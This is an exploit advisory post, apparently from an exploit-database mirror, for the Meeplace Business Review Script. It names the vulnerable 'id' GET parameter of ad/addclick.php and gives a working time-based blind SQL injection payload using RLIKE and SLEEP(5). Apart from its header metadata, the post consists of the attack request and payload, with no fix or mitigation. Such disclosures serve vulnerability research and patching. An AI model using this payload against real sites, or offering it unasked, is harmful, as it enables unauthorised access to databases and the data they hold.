---
layout:     post
title:      "Meeplace Business Review Script - 'id' SQL Injection"
date:       2019-03-22 12:34
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: Meeplace Business Review Script - 'id' SQL Injection
# Date: 22.03.2019
# Dork:
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: http://www.meeplace.com
# Demo Site: http://demo.meeplace.com
# Version: Lastest
# Tested on: Kali Linux
# CVE: N/A

----- PoC: SQLi -----

# Request: http://localhost/[PATH]/ad/addclick.php?&id=1
# Vulnerable Parameter: id (GET)
# Payload: &id=1 RLIKE (SELECT * FROM (SELECT(SLEEP(5)))qcFZ)
            
